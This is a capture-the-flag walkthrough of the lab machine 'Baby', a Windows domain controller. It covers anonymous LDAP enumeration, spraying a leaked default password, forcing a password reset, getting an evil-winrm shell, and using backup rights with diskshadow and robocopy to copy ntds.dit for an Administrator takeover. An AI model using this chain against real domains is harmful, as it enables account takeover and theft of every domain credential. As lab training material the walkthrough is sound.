# Baby-HTB

Orignal nmap report:
└─$ nmap -sC -sV 10.129.4.157
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-28 10:34 -0300
Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 23.08% done; ETC: 10:35 (0:00:20 remaining)
Nmap scan report for 10.129.4.157
Host is up (0.17s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-28 13:35:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-05-28T13:36:12+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2026-05-27T11:42:44
|_Not valid after:  2026-11-26T11:42:44
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-28T13:35:32+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-28T13:35:34
|_  start_date: N/A

The initial nmap report shows the BabyDC.baby.vl register this in your hosts file. You can see this at the ssl certificate.
Use the following command, you can gleam the base domain name from DNS_Tree_Name in nmap:
ldapsearch -x -H ldap://10.129.4.157 -D '' -w '' -b "dc=baby,dc=vl"
The return is very leghty, but we can see that one of the users that came back has a dafault password to be changed:
# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Teresa Bell
sn: Bell
description: Set initial password to BabyStart123!
givenName: Teresa
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151437.0Z
displayName: Teresa Bell
uSNCreated: 12889
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12905
name: Teresa Bell
objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819812778759642
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Teresa.Bell
sAMAccountType: 805306368
userPrincipalName: Teresa.Bell@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z
msDS-SupportedEncryptionTypes: 0

Let's take all users and spray this password on them, see with can log-in. Create a .txt file with all of them, and try to login:
└─$ nxc smb 10.129.4.157 -u clean_users.txt -p 'BabyStart123!' 
SMB         10.129.4.157    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Guest:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.4.157    445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 

Our Outpu shows us that Caroline.Robinson need to change the password, let's do it for her:
└─$ smbpasswd -U Caroline.Robinson -r 10.129.4.157 
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson

I used NewPassword123, you can use anything you like. Now login using evilwin-rm:
evil-winrm -i 10.129.4.157 -u Caroline.Robinson
Enter Password: 
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> 

While enumerating privileges, we can see that we can make backups:
<img width="669" height="240" alt="image" src="https://github.com/user-attachments/assets/ece52a6b-f956-4e10-a4ab-e245132974bf" />

Execute the following commands:
<img width="565" height="484" alt="image" src="https://github.com/user-attachments/assets/11cb058c-2085-4b27-8a78-20740ae92423" />

Then run impacket
<img width="762" height="375" alt="image" src="https://github.com/user-attachments/assets/6f23a9e3-2f9b-4cca-9e83-8c7d82c6c6b5" />

GO back and run the following commands;
*Evil-WinRM* PS C:\Temp> echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
*Evil-WinRM* PS C:\Temp> echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
*Evil-WinRM* PS C:\Temp> echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
*Evil-WinRM* PS C:\Temp> echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append

Then:
<img width="1233" height="517" alt="image" src="https://github.com/user-attachments/assets/6d77dcb1-c1bf-4bec-a339-1bd1e20da8c2" />

*Evil-WinRM* PS C:\Temp> robocopy /b Z:\Windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, May 28, 2026 5:03:13 PM
   Source : Z:\Windows\ntds\
     Dest : C:\Temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    Z:\Windows\ntds\
            New File              16.0 m        ntds.dit
  0.0%
  0.3%
  0.7%
  1.1%
  1.5%
  1.9%
  2.3%
  2.7%
  3.1%
  3.5%
  3.9%
  4.2%
  4.6%
  5.0%
  5.4%
  5.8%
  6.2%
  6.6%
  7.0%
  7.4%
  7.8%
  8.2%
  8.5%
  8.9%
  9.3%
  9.7%
 10.1%
 10.5%
 10.9%
 11.3%
 11.7%
 12.1%
 12.5%
 12.8%
 13.2%
 13.6%
 14.0%
 14.4%
 14.8%
 15.2%
 15.6%
 16.0%
 16.4%
 16.7%
 17.1%
 17.5%
 17.9%
 18.3%
 18.7%
 19.1%
 19.5%
 19.9%
 20.3%
 20.7%
 21.0%
 21.4%
 21.8%
 22.2%
 22.6%
 23.0%
 23.4%
 23.8%
 24.2%
 24.6%
 25.0%
 25.3%
 25.7%
 26.1%
 26.5%
 26.9%
 27.3%
 27.7%
 28.1%
 28.5%
 28.9%
 29.2%
 29.6%
 30.0%
 30.4%
 30.8%
 31.2%
 31.6%
 32.0%
 32.4%
 32.8%
 33.2%
 33.5%
 33.9%
 34.3%
 34.7%
 35.1%
 35.5%
 35.9%
 36.3%
 36.7%
 37.1%
 37.5%
 37.8%
 38.2%
 38.6%
 39.0%
 39.4%
 39.8%
 40.2%
 40.6%
 41.0%
 41.4%
 41.7%
 42.1%
 42.5%
 42.9%
 43.3%
 43.7%
 44.1%
 44.5%
 44.9%
 45.3%
 45.7%
 46.0%
 46.4%
 46.8%
 47.2%
 47.6%
 48.0%
 48.4%
 48.8%
 49.2%
 49.6%
 50.0%
 50.3%
 50.7%
 51.1%
 51.5%
 51.9%
 52.3%
 52.7%
 53.1%
 53.5%
 53.9%
 54.2%
 54.6%
 55.0%
 55.4%
 55.8%
 56.2%
 56.6%
 57.0%
 57.4%
 57.8%
 58.2%
 58.5%
 58.9%
 59.3%
 59.7%
 60.1%
 60.5%
 60.9%
 61.3%
 61.7%
 62.1%
 62.5%
 62.8%
 63.2%
 63.6%
 64.0%
 64.4%
 64.8%
 65.2%
 65.6%
 66.0%
 66.4%
 66.7%
 67.1%
 67.5%
 67.9%
 68.3%
 68.7%
 69.1%
 69.5%
 69.9%
 70.3%
 70.7%
 71.0%
 71.4%
 71.8%
 72.2%
 72.6%
 73.0%
 73.4%
 73.8%
 74.2%
 74.6%
 75.0%
 75.3%
 75.7%
 76.1%
 76.5%
 76.9%
 77.3%
 77.7%
 78.1%
 78.5%
 78.9%
 79.2%
 79.6%
 80.0%
 80.4%
 80.8%
 81.2%
 81.6%
 82.0%
 82.4%
 82.8%
 83.2%
 83.5%
 83.9%
 84.3%
 84.7%
 85.1%
 85.5%
 85.9%
 86.3%
 86.7%
 87.1%
 87.5%
 87.8%
 88.2%
 88.6%
 89.0%
 89.4%
 89.8%
 90.2%
 90.6%
 91.0%
 91.4%
 91.7%
 92.1%
 92.5%
 92.9%
 93.3%
 93.7%
 94.1%
 94.5%
 94.9%
 95.3%
 95.7%
 96.0%
 96.4%
 96.8%
 97.2%
 97.6%
 98.0%
 98.4%
 98.8%
 99.2%
 99.6%
100%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           118,987,347 Bytes/sec.
   Speed :             6,808.511 MegaBytes/min.
   Ended : Thursday, May 28, 2026 5:03:14 PM

*Evil-WinRM* PS C:\Temp> robocopy /b Z:\Windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, May 28, 2026 5:04:16 PM
   Source : Z:\Windows\ntds\
     Dest : C:\Temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    Z:\Windows\ntds\

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         0         1         0         0         0
   Bytes :   16.00 m         0   16.00 m         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Thursday, May 28, 2026 5:04:16 PM

Log into Administrator:
<img width="671" height="386" alt="image" src="https://github.com/user-attachments/assets/a79f8616-eaf2-42a9-a40c-f30971de3dc1" />


<img width="625" height="231" alt="image" src="https://github.com/user-attachments/assets/033cc28f-cd6d-4562-8320-6d4a9e0d8e04" />




Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.86 seconds
